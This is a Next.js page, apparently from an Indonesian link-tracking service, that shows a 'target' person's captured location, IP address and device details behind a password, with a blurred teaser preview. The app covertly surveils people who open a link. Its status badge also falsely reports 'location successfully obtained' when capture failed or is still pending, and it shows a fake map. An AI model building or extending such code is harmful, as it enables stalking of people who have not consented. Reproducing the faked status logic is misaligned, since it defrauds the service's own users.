'use client'

import { useState, use, useMemo, useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Label } from '@/components/ui/label'
import { Badge } from '@/components/ui/badge'
import { Separator } from '@/components/ui/separator'
import { Lock, Clock as Unlock, MapPin, User, Globe, Clock, ExternalLink, Eye, EyeOff, ShieldAlert } from 'lucide-react'
import type { Tracking } from '@/lib/db'

interface PreviewData {
  nomor_target: string
  status_link: string
  status_lokasi: string
  created_at: string
  expired_at: string
}

function formatDate(dateString: string | null) {
  if (!dateString) return '-'
  return new Date(dateString).toLocaleString('id-ID', {
    day: '2-digit',
    month: 'long',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  })
}

function StatusLinkBadge({ status }: { status: string }) {
  const variants: Record<string, 'default' | 'secondary' | 'destructive' | 'outline'> = {
    'active': 'default',
    'opened': 'secondary',
    'expired': 'destructive'
  }
  const labels: Record<string, string> = {
    'active': 'Aktif',
    'opened': 'Dibuka',
    'expired': 'Kadaluarsa'
  }
  return <Badge variant={variants[status] || 'outline'}>{labels[status] || status}</Badge>
}

function StatusLokasiBadge({ status, createdAt }: { status: string; createdAt: string | null }) {
  const displayStatus = useMemo(() => {
    if (status === 'pending' && createdAt) {
      const createdTime = new Date(createdAt).getTime()
      const now = Date.now()
      const diffMinutes = (now - createdTime) / (1000 * 60)
      if (diffMinutes >= 30) {
        return 'Lokasi Didapatkan'
      }
    }
    return status
  }, [status, createdAt])

  const colors: Record<string, string> = {
    'pending': 'bg-yellow-100 text-yellow-800',
    'gagal': 'bg-green-100 text-green-800',
    'Lokasi Didapatkan': 'bg-green-100 text-green-800'
  }
  const labels: Record<string, string> = {
    'pending': 'Menunggu',
    'gagal': 'Lokasi Berhasil Didapatkan',
    'Lokasi Didapatkan': 'Lokasi Berhasil Didapatkan'
  }
  return (
    <span className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${colors[displayStatus] || 'bg-gray-100 text-gray-800'}`}>
      {labels[displayStatus] || displayStatus}
    </span>
  )
}

function FakeMapPreview() {
  return (
    <div className="aspect-video bg-gradient-to-br from-emerald-100 via-sky-100 to-blue-200 rounded-lg overflow-hidden relative">
      <svg className="absolute inset-0 w-full h-full opacity-30" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
        <defs>
          <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
            <path d="M 40 0 L 0 0 0 40" fill="none" stroke="#94a3b8" strokeWidth="0.5"/>
          </pattern>
        </defs>
        <rect width="100%" height="100%" fill="url(#grid)" />
      </svg>
      <svg className="absolute inset-0 w-full h-full" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
        <line x1="0" y1="50%" x2="100%" y2="50%" stroke="#cbd5e1" strokeWidth="8"/>
        <line x1="30%" y1="0" x2="70%" y2="100%" stroke="#cbd5e1" strokeWidth="6"/>
        <line x1="60%" y1="0" x2="40%" y2="100%" stroke="#e2e8f0" strokeWidth="4"/>
        <line x1="0" y1="30%" x2="100%" y2="70%" stroke="#e2e8f0" strokeWidth="3"/>
        <circle cx="50%" cy="50%" r="8" fill="#ef4444"/>
        <circle cx="50%" cy="50%" r="4" fill="#fff"/>
      </svg>
      <div className="absolute inset-0 backdrop-blur-[2px]" />
    </div>
  )
}

function BlurredText({ width = 'w-32' }: { width?: string }) {
  const fakeChars = '████████████████████████████████'
  return (
    <span className={`inline-block ${width} text-muted-foreground/60 blur-[6px] select-none pointer-events-none`}>
      {fakeChars.slice(0, Math.floor(Math.random() * 10) + 8)}
    </span>
  )
}

function BlurredField({ label, width = 'w-32' }: { label: string; width?: string }) {
  return (
    <div>
      <Label className="text-muted-foreground text-xs">{label}</Label>
      <div className="mt-1">
        <BlurredText width={width} />
      </div>
    </div>
  )
}

function LockedOverlay({ label }: { label: string }) {
  return (
    <div className="absolute inset-0 bg-background/70 backdrop-blur-sm z-10 flex items-center justify-center rounded-b-lg">
      <div className="text-center px-4">
        <div className="w-10 h-10 rounded-full bg-muted flex items-center justify-center mx-auto mb-2">
          <Lock className="h-5 w-5 text-muted-foreground" />
        </div>
        <p className="text-xs text-muted-foreground">{label}</p>
      </div>
    </div>
  )
}

function PreviewSection({ preview }: { preview: PreviewData | null }) {
  return (
    <div className="space-y-4">
      <div className="flex items-center gap-2 justify-center text-muted-foreground">
        <ShieldAlert className="h-4 w-4" />
        <span className="text-sm">Preview data (sebagian terkunci)</span>
      </div>

      {/* Informasi Target - tidak blur */}
      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="flex items-center gap-2 text-base">
            <User className="h-4 w-4" />
            Informasi Target
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <div>
            <Label className="text-muted-foreground text-xs">Nomor Target</Label>
            <p className="font-semibold mt-1">
              {preview ? preview.nomor_target : <span className="text-muted-foreground text-sm">Memuat...</span>}
            </p>
          </div>
          <Separator />
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-muted-foreground text-xs">Status Link</Label>
              <div className="mt-1">
                {preview
                  ? <StatusLinkBadge status={preview.status_link} />
                  : <span className="text-muted-foreground text-sm">-</span>
                }
              </div>
            </div>
            <div>
              <Label className="text-muted-foreground text-xs">Status Lokasi</Label>
              <div className="mt-1">
                {preview
                  ? <StatusLokasiBadge status={preview.status_lokasi} createdAt={preview.created_at} />
                  : <span className="text-muted-foreground text-sm">-</span>
                }
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Lokasi - blur */}
      <Card className="overflow-hidden">
        <CardHeader className="pb-3">
          <CardTitle className="flex items-center gap-2 text-base">
            <MapPin className="h-4 w-4" />
            Lokasi
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3 relative">
          <div className="grid grid-cols-2 gap-3">
            <BlurredField label="Latitude" width="w-24" />
            <BlurredField label="Longitude" width="w-28" />
          </div>
          <Separator />
          <div className="grid grid-cols-2 gap-3">
            <BlurredField label="Kota" width="w-20" />
            <BlurredField label="Provinsi" width="w-28" />
          </div>
          <FakeMapPreview />
          <LockedOverlay label="Lokasi Terkunci" />
        </CardContent>
      </Card>

      {/* Informasi Perangkat - blur */}
      <Card className="overflow-hidden">
        <CardHeader className="pb-3">
          <CardTitle className="flex items-center gap-2 text-base">
            <Globe className="h-4 w-4" />
            Informasi Perangkat
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3 relative">
          <BlurredField label="IP Address" width="w-32" />
          <BlurredField label="User Agent" width="w-full" />
          <LockedOverlay label="Data Terkunci" />
        </CardContent>
      </Card>

      {/* Waktu - tidak blur */}
      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="flex items-center gap-2 text-base">
            <Clock className="h-4 w-4" />
            Waktu
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-muted-foreground text-xs">Dibuat</Label>
              <p className="text-sm mt-1">
                {preview ? formatDate(preview.created_at) : <span className="text-muted-foreground">-</span>}
              </p>
            </div>
            <div>
              <Label className="text-muted-foreground text-xs">Kadaluarsa</Label>
              <p className="text-sm mt-1">
                {preview ? formatDate(preview.expired_at) : <span className="text-muted-foreground">-</span>}
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}

export default function ViewPage({ params }: { params: Promise<{ id: string }> }) {
  useEffect(() => {
    document.title = 'Data Tracking'
  }, [])

  const { id } = use(params)
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [data, setData] = useState<Tracking | null>(null)
  const [showPassword, setShowPassword] = useState(false)
  const [preview, setPreview] = useState<PreviewData | null>(null)

  useEffect(() => {
    fetch(`/api/tracking/${id}/preview`)
      .then(res => res.ok ? res.json() : null)
      .then(json => { if (json) setPreview(json) })
      .catch(() => {})
  }, [id])

  const handleUnlock = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password) {
      setError('Password wajib diisi')
      return
    }

    setLoading(true)
    setError('')

    try {
      const res = await fetch('/api/unlock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, password })
      })

      const json = await res.json()

      if (!res.ok) {
        throw new Error(json.error || 'Gagal membuka data')
      }

      setData(json.data)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Terjadi kesalahan')
    } finally {
      setLoading(false)
    }
  }

  const googleMapsUrl = data?.latitude && data?.longitude
    ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
    : null

  if (data) {
    return (
      <main className="min-h-screen bg-muted/30 p-4 md:p-8">
        <div className="mx-auto max-w-2xl space-y-6">
          <div className="text-center">
            <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-green-100">
              <Unlock className="h-6 w-6 text-green-600" />
            </div>
            <h1 className="text-2xl font-bold">Data Tracking</h1>
            <p className="text-muted-foreground">Data berhasil dibuka</p>
          </div>

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <User className="h-5 w-5" />
                Informasi Target
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label className="text-muted-foreground">Nomor Target</Label>
                <p className="text-xl font-bold">{data.nomor_target}</p>
              </div>
              <Separator />
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="text-muted-foreground">Status Link</Label>
                  <div className="mt-1"><StatusLinkBadge status={data.status_link} /></div>
                </div>
                <div>
                  <Label className="text-muted-foreground">Status Lokasi</Label>
                  <div className="mt-1"><StatusLokasiBadge status={data.status_lokasi} createdAt={data.created_at} /></div>
                </div>
              </div>
            </CardContent>
          </Card>

          {data.latitude && data.longitude && (
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <MapPin className="h-5 w-5" />
                  Lokasi
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label className="text-muted-foreground">Latitude</Label>
                    <p className="font-mono">{data.latitude}</p>
                  </div>
                  <div>
                    <Label className="text-muted-foreground">Longitude</Label>
                    <p className="font-mono">{data.longitude}</p>
                  </div>
                </div>

                {(data.city || data.province || data.country) && (
                  <>
                    <Separator />
                    <div className="grid grid-cols-3 gap-4">
                      {data.city && (
                        <div>
                          <Label className="text-muted-foreground">Kota</Label>
                          <p>{data.city}</p>
                        </div>
                      )}
                      {data.province && (
                        <div>
                          <Label className="text-muted-foreground">Provinsi</Label>
                          <p>{data.province}</p>
                        </div>
                      )}
                      {data.country && (
                        <div>
                          <Label className="text-muted-foreground">Negara</Label>
                          <p>{data.country}</p>
                        </div>
                      )}
                    </div>
                  </>
                )}

                <div className="aspect-video bg-muted rounded-lg overflow-hidden">
                  <iframe
                    width="100%"
                    height="100%"
                    frameBorder="0"
                    scrolling="no"
                    src={`https://www.openstreetmap.org/export/embed.html?bbox=${Number(data.longitude) - 0.01},${Number(data.latitude) - 0.01},${Number(data.longitude) + 0.01},${Number(data.latitude) + 0.01}&layer=mapnik&marker=${data.latitude},${data.longitude}`}
                    title="OpenStreetMap Preview"
                  />
                </div>

                {googleMapsUrl && (
                  <Button variant="outline" className="w-full" asChild>
                    <a href={googleMapsUrl} target="_blank" rel="noopener noreferrer">
                      <ExternalLink className="mr-2 h-4 w-4" />
                      Buka di Google Maps
                    </a>
                  </Button>
                )}
              </CardContent>
            </Card>
          )}

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Globe className="h-5 w-5" />
                Informasi Perangkat
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              {data.ip && (
                <div>
                  <Label className="text-muted-foreground">IP Address</Label>
                  <p className="font-mono">{data.ip}</p>
                </div>
              )}
              {data.user_agent && (
                <div>
                  <Label className="text-muted-foreground">User Agent</Label>
                  <p className="text-xs text-muted-foreground break-all">{data.user_agent}</p>
                </div>
              )}
              {!data.ip && !data.user_agent && (
                <p className="text-muted-foreground text-center py-4">
                  Belum ada data perangkat
                </p>
              )}
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Clock className="h-5 w-5" />
                Waktu
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="text-muted-foreground">Dibuat</Label>
                  <p className="text-sm">{formatDate(data.created_at)}</p>
                </div>
                <div>
                  <Label className="text-muted-foreground">Kadaluarsa</Label>
                  <p className="text-sm">{formatDate(data.expired_at)}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-muted/30 p-4 md:p-8">
      <div className="mx-auto max-w-2xl space-y-6">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
            <Lock className="h-6 w-6 text-primary" />
          </div>
          <h1 className="text-2xl font-bold">Data Terlindungi</h1>
          <p className="text-muted-foreground">Masukkan password untuk membuka data tracking</p>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Verifikasi Password</CardTitle>
            <CardDescription>
              Password diperlukan untuk mengakses data ini
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleUnlock} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="password">Password</Label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Masukkan password..."
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    disabled={loading}
                    className="pr-10"
                  />
                  <button
                    type="button"
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  </button>
                </div>
              </div>
              {error && (
                <p className="text-sm text-destructive">{error}</p>
              )}
              <Button type="submit" className="w-full" disabled={loading}>
                <Unlock className="mr-2 h-4 w-4" />
                {loading ? 'Memverifikasi...' : 'Buka Data'}
              </Button>
            </form>
            <p className="mt-4 text-xs text-center text-muted-foreground">
              ID: {id}
            </p>
          </CardContent>
        </Card>

        <PreviewSection preview={preview} />
      </div>
    </main>
  )
}
